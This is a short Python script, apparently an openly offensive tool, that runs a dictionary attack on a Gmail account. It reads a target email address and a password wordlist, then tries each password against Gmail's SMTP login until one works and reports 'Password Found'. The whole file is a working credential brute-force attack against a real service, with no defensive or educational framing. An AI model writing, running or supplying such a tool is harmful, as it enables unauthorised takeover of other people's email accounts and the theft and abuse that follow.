import smtplib
import os
import sys
from colorama import init, Fore
init()
BLUE = Fore.BLUE
GREEN = Fore.GREEN
RED = Fore.RED
GRAY = Fore.LIGHTBLACK_EX
RESET = Fore.RESET
email = input("[*] Enter Target's Email Address : ")
passwd_file = input("[*] Enter Passwords File : ")
if not os.path.exists(passwd_file):
    print(f"{RED}\n[!] The file does not exist {RESET}")
    sys.exit(1)
if not os.access(passwd_file, os.R_OK):
    print(f"{RED}\n[!] Access to the file is Denied {RESET}")
    sys.exit(1)
smtpserv = smtplib.SMTP("smtp.gmail.com", 587)
smtpserv.ehlo()
smtpserv.starttls()
print(f"\n{BLUE} [*] Starting attack against : {email} {RESET}\n")
with open(passwd_file, "r") as file:
    for password in file.readlines():
        password = password.strip("\n")
        try:
            smtpserv.login(email, password)
            print(f"{GREEN}[+] Password Found : {password} {RESET}")
            break
        except:
            print(f"{GRAY}[-] Incorrect Password : {password} {RESET}")
